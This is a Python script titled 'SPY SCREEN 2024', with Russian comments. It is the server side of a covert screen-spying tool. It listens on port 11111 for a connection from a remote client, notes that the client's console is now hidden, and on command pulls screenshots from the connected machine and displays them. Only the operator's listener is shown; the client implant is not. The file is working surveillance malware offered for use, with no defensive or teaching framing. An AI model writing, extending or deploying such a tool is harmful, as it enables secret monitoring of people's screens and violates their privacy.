import socket
import pyautogui
import pickle
import struct
from io import BytesIO
import time
import ctypes
import sys
from PIL import Image

def Update_screen():
    try:
        while True:
            x = input()
            if x=='0':
                print('Получаем скриншот...')
                conn.sendall(b' ')
                time.sleep(1)
                # Получение размера изображения
                message_size = 4
                data = b''
                while len(data) < message_size:
                    data += conn.recv(4096)
                # Извлечение размера изображения
                packed_msg_size = data[:message_size]
                data = data[message_size:]
                msg_size = int.from_bytes(packed_msg_size, byteorder='little')
    
                # Получение самого изображения
                while len(data) < msg_size:
                    data += conn.recv(4096)
    
                # Извлечение изображения
                frame_data = data[:msg_size]
                data = data[msg_size:]
    
                # Декодирование и отображение изображения
                img = Image.open(BytesIO(frame_data))
                img.show()
                print('Скриншот получен!\n')
            if x == '82':
                conn.sendall(b'0')
                server_socket.close()
                print('Соединение разорвано')
    finally:
        print('Системная ошибка')
        #client_socket.shutdown()
        #client_socket.close()
        Update_screen()

print('\n\nSPY SCREEN 2024 by RelictRaven & IPShow\n')
# Настройки
SERVER_IP = '0.0.0.0'  # прослушка всех интерфейсов
PORT = 11111           # Порт для соединения

# Создание сокета
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_IP, PORT))
server_socket.listen(1)
print('Ожидание соединения...')
conn, addr = server_socket.accept()
print(f'Соединено с {addr}')
print('\nУспешное подключение к клиенту, консоль клиента теперь скрыта')
print('\nДля получения снимка экрана нажмите 0, затем Enter')
print('Для разрыва соединения нажмите 82, затем Enter\n')
Update_screen()